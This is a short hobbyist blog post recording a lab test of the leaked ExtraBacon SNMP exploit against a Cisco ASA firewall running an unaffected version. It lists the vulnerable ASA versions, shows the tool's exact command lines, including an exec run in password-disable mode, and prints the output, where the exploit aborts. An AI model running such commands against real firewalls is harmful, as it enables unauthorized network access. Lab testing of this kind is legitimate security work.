---
layout: post
title: ExtraBacon Test On ASA Firewall
tags:
- asa
- cisco
- exploit
- extrabacon
- firewall
- hacking
- leaked
- nsa
- pentesting
---

![](http://www.baconcoma.com/wp-content/uploads/2012/10/Extra-Bacon.jpg)

Hello everyone. i found some free time today and thought to give it a shot on extrabacon exploit of NSA's Leaked stuff...
there are already some successful articles out there about it but i wanted to show you what happens on a newer ASA firewall when the explot fails.

Extrabacon exploit is a remote code execution exploit against Cisco Adaptive Security Appliance (ASA) devices affecting ASA versions 802, 803, 804, 805, 821, 822, 823, 824, 825, 831, 832, 841, 842, 843, 844. It exploits an overflow vulnerability using the Simple Network Management Protocol (SNMP) and relies on knowing the target's uptime and software version.

In my case i installed a firewall ASA 921 and of course it didn't work as expected. This version is not affected.
This is the outcome of the execution for info>root@trickster0-virtual-machine:/home/trickster0/Desktop/EXBA# python extrabacon_1.1.0.1.py info -t 192.168.0.128 -v -c public
WARNING: No route found for IPv6 destination :: (no default route?)
Logging to /home/trickster0/Desktop/EXBA/concernedparent
[+] Executing:  extrabacon_1.1.0.1.py info -t 192.168.0.128 -v -c public
[+] running from /home/trickster0/Desktop/EXBA
[+] probing target via snmp
[+] Connecting to 192.168.0.128:161
****************************************
[+] Data returned
[+] 0000   30 7D 02 01 01 04 06 70  75 62 6C 69 63 A2 70 02   0}.....public.p.
[+] 0010   01 00 02 01 00 02 01 00  30 65 30 3C 06 08 2B 06   ........0e0<..+.
[+] 0020   01 02 01 01 01 00 04 30  43 69 73 63 6F 20 41 64   .......0Cisco Ad
[+] 0030   61 70 74 69 76 65 20 53  65 63 75 72 69 74 79 20   aptive Security 
[+] 0040   41 70 70 6C 69 61 6E 63  65 20 56 65 72 73 69 6F   Appliance Versio
[+] 0050   6E 20 39 2E 32 28 31 29  30 0F 06 08 2B 06 01 02   n 9.2(1)0...+...
[+] 0060   01 01 03 00 43 03 00 92  E0 30 14 06 08 2B 06 01   ....C....0...+..
[+] 0070   02 01 01 05 00 04 08 63  69 73 63 6F 61 73 61      .......ciscoasa
###[ SNMP ]###
  version   = 
  community = 
  \PDU       \
   |###[ SNMPresponse ]###
   |  id        = 
   |  error     = 
   |  error_index= 
   |  \varbindlist\
   |   |###[ SNMPvarbind ]###
   |   |  oid       = 
   |   |  value     = 
   |   |###[ SNMPvarbind ]###
   |   |  oid       = 
   |   |  value     = 
   |   |###[ SNMPvarbind ]###
   |   |  oid       = 
   |   |  value     = 
[+] End of  Data returned

[+] response:
###[ SNMP ]###
  version   = 
  community = 
  \PDU       \
   |###[ SNMPresponse ]###
   |  id        = 
   |  error     = 
   |  error_index= 
   |  \varbindlist\
   |   |###[ SNMPvarbind ]###
   |   |  oid       = 
   |   |  value     = 
   |   |###[ SNMPvarbind ]###
   |   |  oid       = 
   |   |  value     = 
   |   |###[ SNMPvarbind ]###
   |   |  oid       = 
   |   |  value     = 

[+] firewall uptime is 37600 time ticks, or 0:06:16

[+] firewall name is ciscoasa

[-] target is running Cisco Adaptive Security Appliance Version 9.2(1), which is NOT supported
Data stored in key file  : unsupported
Data stored in self.vinfo: UNSUPPORTED

To check the key file to see if it really contains what we're claiming:
# cat /home/trickster0/Desktop/EXBA/keys/Y57qgB.key


This is the output for the exec


>root@trickster0-virtual-machine:/home/trickster0/Desktop/EXBA# python extrabacon_1.1.0.1.py exec -t 192.168.0.128 -v -c public --mode pass-disable
WARNING: No route found for IPv6 destination :: (no default route?)
Logging to /home/trickster0/Desktop/EXBA/concernedparent
[+] Executing:  extrabacon_1.1.0.1.py exec -t 192.168.0.128 -v -c public --mode pass-disable
[+] running from /home/trickster0/Desktop/EXBA
[+] probing target via snmp
[+] Connecting to 192.168.0.128:161
****************************************
[+] Data returned
[+] 0000   30 7D 02 01 01 04 06 70  75 62 6C 69 63 A2 70 02   0}.....public.p.
[+] 0010   01 00 02 01 00 02 01 00  30 65 30 3C 06 08 2B 06   ........0e0<..+.
[+] 0020   01 02 01 01 01 00 04 30  43 69 73 63 6F 20 41 64   .......0Cisco Ad
[+] 0030   61 70 74 69 76 65 20 53  65 63 75 72 69 74 79 20   aptive Security 
[+] 0040   41 70 70 6C 69 61 6E 63  65 20 56 65 72 73 69 6F   Appliance Versio
[+] 0050   6E 20 39 2E 32 28 31 29  30 0F 06 08 2B 06 01 02   n 9.2(1)0...+...
[+] 0060   01 01 03 00 43 03 00 E3  BC 30 14 06 08 2B 06 01   ....C....0...+..
[+] 0070   02 01 01 05 00 04 08 63  69 73 63 6F 61 73 61      .......ciscoasa
###[ SNMP ]###
  version   = 
  community = 
  \PDU       \
   |###[ SNMPresponse ]###
   |  id        = 
   |  error     = 
   |  error_index= 
   |  \varbindlist\
   |   |###[ SNMPvarbind ]###
   |   |  oid       = 
   |   |  value     = 
   |   |###[ SNMPvarbind ]###
   |   |  oid       = 
   |   |  value     = 
   |   |###[ SNMPvarbind ]###
   |   |  oid       = 
   |   |  value     = 
[+] End of  Data returned

[+] response:
###[ SNMP ]###
  version   = 
  community = 
  \PDU       \
   |###[ SNMPresponse ]###
   |  id        = 
   |  error     = 
   |  error_index= 
   |  \varbindlist\
   |   |###[ SNMPvarbind ]###
   |   |  oid       = 
   |   |  value     = 
   |   |###[ SNMPvarbind ]###
   |   |  oid       = 
   |   |  value     = 
   |   |###[ SNMPvarbind ]###
   |   |  oid       = 
   |   |  value     = 

[+] firewall uptime is 58300 time ticks, or 0:09:43

[+] firewall name is ciscoasa

[-] target is running Cisco Adaptive Security Appliance Version 9.2(1), which is NOT supported
Data stored in key file  : unsupported
Data stored in self.vinfo: UNSUPPORTED
[+] generating exploit for exec mode pass-disable
[-] unsupported target version, abort


I will try and test some more stuff for fun. Have a nice day everyone!
